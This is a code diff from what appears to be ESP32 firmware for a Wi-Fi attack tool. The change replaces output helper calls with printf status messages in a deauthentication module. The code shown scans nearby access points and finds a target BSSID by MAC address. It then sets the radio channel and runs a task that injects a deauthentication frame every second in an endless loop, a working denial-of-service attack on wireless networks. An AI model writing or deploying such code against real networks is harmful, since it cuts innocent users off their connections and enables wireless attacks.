@@ -9,7 +9,6 @@
 #include <stdio.h>
 #include <string.h>
 
-#include "arma_output.h"
 #include "arma_utils.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
@@ -51,13 +50,15 @@ void load_deauth_payload() {
 }
 
 void arma_run_deauth() {
-  output_started_deauth(u_target_bssid);
+  uint8_t *b = u_target_bssid;
+  printf("{DEAUTH,DEAUTH_STARTED,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1],
+         b[2], b[3], b[4], b[5]);
   int current_time = 0;
 
   while (1) {
     vTaskDelay(1000 / portTICK_PERIOD_MS);
-    output_deauth_status(current_time);
     wifi_inject_frame(deauth_payload, 26);
+    printf("{DEAUTH,INJECTED_DEAUTH,%d,}\n", current_time);
     current_time++;
   }
 }
@@ -77,7 +78,7 @@ void arma_deauth_finish() {
 }
 
 void arma_deauth_launching_sequence(uint8_t channel) {
-  output_deauth_launching_sequence();
+  printf("{DEAUTH,LAUNCHING_SEQUENCE,}\n");
   wifi_set_channel(channel);
   xTaskCreatePinnedToCore(arma_run_deauth, TDI_NAME, TDI_STACK_SIZE, NULL,
                           TDI_PRIORITY, &arma_deauth_task_handle, TDI_CORE_ID);
@@ -91,19 +92,23 @@ void arma_deauth(char *target_bssid) {
   ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
   wifi_ap_record_t *ap_records = ap_list->ap_record_list;
   uint16_t total_scanned_aps = ap_list->count;
-  output_number_of_aps(total_scanned_aps);
+  printf("{DEAUTH,FOUND_APS,%u,}\n", total_scanned_aps);
 
   uint8_t found_target_ap = 0;
   uint8_t index_of_target_ap = 0;
   for (uint16_t i = 0; i < total_scanned_aps; i++) {
     wifi_ap_record_t ap_record = ap_records[i];
-    output_ap_info(&ap_record);
+    uint8_t *bssid = ap_record.bssid;
+    printf("{DEAUTH,SCAN,%02X%02X%02X%02X%02X%02X,%s,%02X,%02X,}\n", bssid[0],
+           bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ap_record.ssid,
+           (uint8_t)ap_record.rssi, (uint8_t)ap_record.primary);
 
     if (memcmp(ap_record.bssid, u_target_bssid, 6) == 0) {
       found_target_ap = 1;
       index_of_target_ap = i;
     }
   }
+  printf("{DEAUTH,FINISH_SCAN,}\n");
 
   if (found_target_ap == 1) {
     wifi_ap_record_t ap_record = ap_records[index_of_target_ap];
@@ -111,6 +116,8 @@ void arma_deauth(char *target_bssid) {
     printf("arma_deauth.arma_deauth > Channel of target AP: %u\n", channel);
     arma_deauth_launching_sequence(channel);
   } else if (found_target_ap == 0) {
-    output_failed_deauth_not_found_ap(u_target_bssid);
+    uint8_t *b = u_target_bssid;
+    printf("{DEAUTH,AP_NOT_FOUND,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1],
+           b[2], b[3], b[4], b[5]);
   }
 }
